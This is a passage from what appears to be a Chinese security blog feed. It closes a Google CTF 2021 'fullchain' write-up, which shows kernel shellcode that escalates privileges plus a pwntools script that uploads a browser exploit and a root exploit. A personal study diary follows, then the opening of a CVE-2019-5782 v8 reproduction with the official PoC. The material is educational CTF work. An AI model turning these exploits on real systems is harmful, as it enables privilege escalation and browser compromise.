    <span class="token class-name">uint64_t</span> pre <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> PREPARE_KERNEL_CRED<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> com <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> COMMIT_CREDS<span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pre<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellcode<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>com<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call shellcode\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"restore fop\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> save_file<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pwn!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>exp.py：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python3</span>

<span class="token keyword">from</span> kctfpow <span class="token keyword">import</span> solve_challenge
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode

<span class="token keyword">def</span> <span class="token function">to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> <span class="token string">''</span>

    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> s<span class="token punctuation">:</span>
            ch <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
            ret <span class="token operator">+=</span> <span class="token string">'\\x'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
        
    <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> s<span class="token punctuation">:</span>
            ret <span class="token operator">+=</span> <span class="token string">'\\x'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>

    <span class="token keyword">return</span> ret

<span class="token keyword">def</span> <span class="token function">exec_cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'$ '</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">,</span> block_size<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">"Upload"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>
        data <span class="token operator">=</span> fd<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string">"%d / %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        exec_cmd<span class="token punctuation">(</span><span class="token string">"echo -e -n '%s' >> %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>to_hex<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>block_size<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token punctuation">)</span>


sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fullchain.2021.ctfcompetition.com'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
<span class="token comment"># sh = process(['python3', 'run_qemu.py']) #, stdin=PTY, stdout=PTY)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">') solve '</span><span class="token punctuation">)</span>
solve <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

info<span class="token punctuation">(</span><span class="token string">'solve = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solve<span class="token punctuation">)</span><span class="token punctuation">)</span>

solution <span class="token operator">=</span> solve_challenge<span class="token punctuation">(</span>solve<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Solution? '</span><span class="token punctuation">,</span> solution<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>


context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'exp.html'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>
    data <span class="token operator">=</span> fd<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

html <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'? '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># sh.interactive()</span>
<span class="token comment"># exit()</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Give me your exploit as base64!\n'</span><span class="token punctuation">,</span> html<span class="token punctuation">)</span>
<span class="token comment"># sh.send(html)</span>
success<span class="token punctuation">(</span><span class="token string">'upload exp.html successfully!'</span><span class="token punctuation">)</span>


exec_cmd<span class="token punctuation">(</span><span class="token string">'bash'</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'exploit chrome successfully!'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>
upload<span class="token punctuation">(</span><span class="token string">'./exp'</span><span class="token punctuation">,</span> <span class="token string">'/tmp/exp'</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
exec_cmd<span class="token punctuation">(</span><span class="token string">'chmod +x /tmp/exp'</span><span class="token punctuation">)</span>

exec_cmd<span class="token punctuation">(</span><span class="token string">'/tmp/exp'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'# '</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'get root!'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>kctfpow: <a href="https://raw.githubusercontent.com/google/kctf/v1/docker-images/challenge/pow.py">https://raw.githubusercontent.com/google/kctf/v1/docker-images/challenge/pow.py</a></p>
<p><img src="/images/68622871/14.png" alt="get!"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题目还是挺有意思的，v8，sandbox-escape 以及 kernel pwn 各个点都比较入门，能学到东西</p>
<p>虽然简单，但就算当时去做，也未必做得出来，一方面网络及其不稳定，容易中途就崩了，另一方面可执行程序太大了，运行个 ROPgadget 或者 ropper 跑了几个小时了还没出来，不知道还能怎么找 gadget 了，再一方面还是可执行程序太大了，ida 打开卡死半天，搜索也卡半天，最后用 ghidra 来分析的</p>
<p><em>直到这篇文章发布，ropper 仍未运行完</em></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308" id="Hatena_wp">https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308 <strong>#Hatena_wp</strong> </a></li>
<li><a href="https://github.com/dqi/ctf_writeup/tree/master/2021/fullchain">https://github.com/dqi/ctf_writeup/tree/master/2021/fullchain</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>kernel</tag>
        <tag>sandbox-escape</tag>
      </tags>
  </entry>
  <entry>
    <title>2021/5/5 随便写写</title>
    <url>/5609a6a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>五一假期最后一天，随便写写记录一下最近干的事情和心情。还整理了最近学习的东西，以及相关的一些文章链接，感兴趣都可以看看</p>
<span id="more"></span>


<h2 id="最近在学"><a href="#最近在学" class="headerlink" title="最近在学"></a>最近在学</h2><h3 id="关于-v8"><a href="#关于-v8" class="headerlink" title="关于 v8"></a>关于 v8</h3><p>最近一整个月都没更新文章，比较摸鱼，断断续续的学习 v8 的漏洞利用，以及打打比赛。关于 v8 的利用之前是打算一周复习一个 CVE 的，本来在 <strong>CVE-2019-5782</strong> 文章后面，应该会发一篇关于 <strong>CVE-2018-17463</strong> 的复现文章了， 但是后来发现，在没有搞懂 v8 JIT 的优化之前，很多 CVE 的复现都只能停留在看前辈的文章逐步跟着走，调试摸清楚 exp 都做了什么，而我想达到的是能够根据官方提供的 poc，能够有能力的自己构造 exp。</p>
<p>所以最近在摸索 v8 的 JIT 优化编译器 <strong>Turbofan</strong>，有点难，学得比较吃力，这里扔下几篇在看的文章吧，同样感兴趣读者可以看看：</p>
<ul>
<li><a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/</a></li>
<li><a href="https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/#simplified-lowering">https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/#simplified-lowering</a></li>
<li><a href="https://www.anquanke.com/post/id/229482">https://www.anquanke.com/post/id/229482</a></li>
<li><a href="https://www.anquanke.com/post/id/229554">https://www.anquanke.com/post/id/229554</a></li>
</ul>
<p>4 月 12 日左右的时候，chrome 爆出 0day，当时 v8 引擎已经修复了，但是 chrome 浏览器没有发布新的版本，仍然存在漏洞，编号是 <strong>CVE-2021-21220</strong>，我就去研究了一下，原理倒是搞懂了，还是那样只能停留在分析别人的 exp 上，而没法根据已有 poc 构造 exp。所以我就没打算写复现文章了。后面陆续发现了 issuse 上有 4 个不同的 poc，都是构造一个长度为 -1 的数组的方式，我打算等学习好 Turbofan 后，再来尝试根据这 4 个 poc，都构造 exp，届时会好好写篇文章（如果我还记得）</p>
<h3 id="关于编译原理"><a href="#关于编译原理" class="headerlink" title="关于编译原理"></a>关于编译原理</h3><p>感觉编译原理挺重要的，而且这方面也有点兴趣，不过我的专业没开这门课，也不想增加自己的学业负担而去跨专业选课，就在 <em>中国大学Mooc</em> 上找了门课程自己学习。说来惭愧，本身自己的课程也没怎么认真听（可以说几乎没听），这编译原理网课倒是学得比自己专业的课程要多，不过进度也比计算机专业的学生慢了点。</p>
<p>五一过后也得好好补补自己专业的课程了哈哈哈。</p>
<h3 id="关于操作系统"><a href="#关于操作系统" class="headerlink" title="关于操作系统"></a>关于操作系统</h3><p>这个可以说是我最大的执念，一直想着写内核，但是一直都是做了一点点又开始忙别的事情去了。这导致我每次想做的时候，都得从头开始再搞懂一些细节。</p>
<p>在这方面的话，这学期在看的书有两本：</p>
<ol>
<li>《操作系统真象还原》  这个本书的这个‘象’字就是这个字，不是错别字</li>
<li>《一个64位操作系统的设计与实现》</li>
</ol>
<p>第一本书看了也有一半了，第二本书还没怎么看，希望这学期都能看完吧</p>
<h3 id="关于编程水平"><a href="#关于编程水平" class="headerlink" title="关于编程水平"></a>关于编程水平</h3><p>最近想提高自己的 C++ 编程水平，跟着文章学习，实现一个 markdown 解析器，其实早该完成的，只是我太摸鱼了，没怎么动，写写停停，周末想起有这回事的时候去写几行代码，两个星期了都还没写完哈哈哈</p>
<p>编程最有意思的时候当然是造轮子啦，趁着还没毕业还没工作，还有时间，当然自娱自乐造轮子啦，最近也发现一个有意思的项目：<br><a href="https://github.com/danistefanovic/build-your-own-x">https://github.com/danistefanovic/build-your-own-x</a></p>
<p>这个项目上汇集了很多编程项目的教程，包括我一直以来最想做的两件事情：</p>
<ol>
<li>从头开始，写一个系统内核，再到一个完整的操作系统</li>
<li>写一个编译器/解释器</li>
</ol>
<p>第一点中，我从上面的项目中看到了一个很符合我想法的教程：<br><a href="https://www.youtube.com/playlist?list=PLHh55M_Kq4OApWScZyPl5HhgsTJS9MZ6M">https://www.youtube.com/playlist?list=PLHh55M_Kq4OApWScZyPl5HhgsTJS9MZ6M</a></p>
<p>这个教程的目录就很吸引我，不仅实现了 GUI，还实现了网络通信</p>
<h2 id="关于-ctf-比赛"><a href="#关于-ctf-比赛" class="headerlink" title="关于 ctf 比赛"></a>关于 ctf 比赛</h2><p>最近主要打了两场国际赛吧，协会一直以来都想向国际靠拢，开始尝试打打国际 ctf 比赛，确实很难。</p>
<p>先是打了 PlaidCTF，题目质量确实挺好的，前面提到的 chrome 0day 直接就用来出题了。题目挺难的，而且我也忙着其他事情，在找到一题的利用点后，交给学弟后，我就跑路了，后面没怎么看题，最后学弟确实做出来了，我也挺开心的</p>
<p>五一假期还打了长 Defcon 的资格赛，pwn 题好多，题目好难，投入时间很多，但没什么收获，应该是题目难度和自身水平差太远了，协会最后就做出了两题 pwn 和 一题 web，只排在了 50 名左右</p>
<p>这两场比赛给我打自闭了，就一直在想为啥别人这么强啊（难道我头发多？</p>
<p>思考了很久，只能用一句话来安慰自己</p>
<blockquote>
<p><strong>“比你强的总有人在，不必太过纠结，好好提升自己的水平就好了”</strong></p>
</blockquote>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>关于操作系统和编译器的两个最想写的项目，可能这学期都没空做了，学业太繁忙，只能先学学理论知识了。</p>
<p>有一件比较开心的事情就是：暑期实习找到了，国内的某安全实验室，具体哪里就不写了<br>还是挺期待实习的，不知道实习后，我的认知和技术会得到什么样提升呢？</p>
<p>现在大二，下学期就大三了，时间过得真快。留给我慢慢接触感兴趣事情的时间还有多少呢？</p>
<p><strong>少画饼，多干事，别想太多，走着瞧吧！</strong></p>
]]></content>
      <tags>
        <tag>琐碎事</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-5782</title>
    <url>/696ac724/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>v8 引擎漏洞 CVE-2019-5872 复现，因本人对 JIT 技术的了解较浅，故本文对漏洞成因的 JIT 方面并不做详细的说明。</p>
<span id="more"></span>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>切换到漏洞修复前的版本，进行编译：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">git</span> checkout b474b3102bd4a95eafcdb68e0e44656046132bc9
$ gclient <span class="token function">sync</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>debug 模式调试会有点问题，所以选择 release 模式进行编译</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ./tools/dev/v8gen.py x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>为了使用 job 等调试命令，在 <code>out.gn/x64.release/args.gn</code> 里写入下面配置：</p>
<pre class="line-numbers language-none"><code class="language-none">is_debug &#x3D; false
target_cpu &#x3D; &quot;x64&quot;
v8_enable_backtrace &#x3D; true
v8_enable_disassembler &#x3D; true
v8_enable_object_print &#x3D; true
v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后编译即可</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ninja -C out.gn/x64.release d8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先使用官方的 Poc 进行测试：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// Copyright 2018 the V8 project authors. All rights reserved.</span>
<span class="token comment">// Use of this source code is governed by a BSD-style license that can be</span>
<span class="token comment">// found in the LICENSE file.</span>
<span class="token comment">// Flags: --allow-natives-syntax</span>
<span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8.91238232205e-313</span><span class="token punctuation">;</span>  <span class="token comment">// 0x2a00000000</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>
a3<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">3.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>fun<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
res <span class="token operator">=</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的 <code>assertEquals</code> 是没有定义的，稍作更改如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
